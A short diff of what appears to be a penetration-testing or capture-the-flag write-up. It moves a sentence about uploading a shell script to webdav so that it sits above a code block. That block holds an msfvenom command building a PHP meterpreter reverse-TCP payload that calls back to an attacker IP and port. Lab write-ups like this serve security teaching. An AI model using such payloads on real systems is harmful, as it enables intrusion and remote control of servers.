@@ -157,11 +157,11 @@ We could then login to webdav using Ryan&#39;s credentials.
 
 #### **Msfvenom**
 
+The next task was to upload a shell script to webdav, in order to create a reverse shell.
+
 ```
 msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 -f raw -o shell.php
 ```
-
-The next task was to upload a shell script to webdav, in order to create a reverse shell.
 
 Using msfvenom we created a payload – shell.php
 
